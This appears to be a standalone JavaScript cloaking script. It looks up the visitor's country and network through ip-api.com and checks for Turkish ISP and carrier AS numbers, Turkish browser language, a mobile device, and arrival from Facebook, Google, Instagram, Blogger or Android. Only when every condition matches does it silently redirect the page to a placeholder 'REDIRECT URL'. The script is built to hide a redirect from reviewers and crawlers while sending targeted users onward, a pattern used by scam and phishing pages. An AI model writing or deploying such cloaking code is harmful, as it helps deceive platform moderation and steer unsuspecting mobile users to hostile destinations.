var endpoint = 'http://ip-api.com/json/?fields=status,message,countryCode,as';
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var response = JSON.parse(this.responseText);
        if (response.status !== 'success') {
            console.log('query failed: ' + response.message);
            return
        }
        window.ulkeGec = 0;
        window.ispGec = 0;
        window.mobilGec = 0;
        window.dilGec = 0;
        window.refGec = 0;
        if (response.countryCode == "TR") {
            window.ulkeGec = 1;
        }
        var str = response.as;
        var a1 = str.search("AS9121");
        var a2 = str.search("AS20978");
        var a3 = str.search("AS15897");
        var a4 = str.search("AS47331");
        var a5 = str.search("AS16135 TURKCELL ILETISIM HIZMETLERI A.S.");
        var a6 = str.search("AS8386");
        var a7 = str.search("AS34984");
        var a8 = str.search("AS34296");
        var a9 = str.search("AS12978");
        var a10 = str.search("AS47524");
        var a11 = str.search("AS12735");
        var a12 = str.search("AS15924");
        if (a1 >= 0) {
            window.ispGec = 1;
        }
        if (a2 >= 0) {
            window.ispGec = 1;
        }
        if (a3 >= 0) {
            window.ispGec = 1;
        }
        if (a4 >= 0) {
            window.ispGec = 1;
        }
        if (a5 >= 0) {
            window.ispGec = 1;
        }
        if (a6 >= 0) {
            window.ispGec = 1;
        }
        if (a7 >= 0) {
            window.ispGec = 1;
        }
        if (a8 >= 0) {
            window.ispGec = 1;
        }
        if (a9 >= 0) {
            window.ispGec = 1;
        }
        if (a10 >= 0) {
            window.ispGec = 1;
        }
        if (a11 >= 0) {
            window.ispGec = 1;
        }
        if (a12 >= 0) {
            window.ispGec = 1;
        }
        var k_lang = navigator.language || navigator.userLanguage;
        if (k_lang == "tr-TR" || k_lang == "tr") {
            window.dilGec = 1;
        }
        if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/webOS/i) || navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) || navigator.userAgent.match(/Windows Phone/i)) {
            window.mobilGec = 1;
        }
        window.x = document.referrer;
        var b1 = window.x.search("facebook");
        var b2 = window.x.search("google");
        var b3 = window.x.search("instagram");
        var b4 = window.x.search("blogger");
        var b5 = window.x.search("android");
        if (b1 >= 0) {
            window.refGec = 1;
        }
        if (b2 >= 0) {
            window.refGec = 1;
        }
        if (b3 >= 0) {
            window.refGec = 1;
        }
        if (b4 >= 0) {
            window.refGec = 1;
        }
        if (b5 >= 0) {
            window.refGec = 1;
        }
        if (window.ulkeGec == 1 && window.ispGec == 1 && window.dilGec == 1 && window.mobilGec == 1 && window.refGec == 1) {
            window.setTimeout(function() {
                window.top.location = "REDIRECT URL";
            }, 2000);
        }
    }
};
xhr.open('GET', endpoint, true);
xhr.send();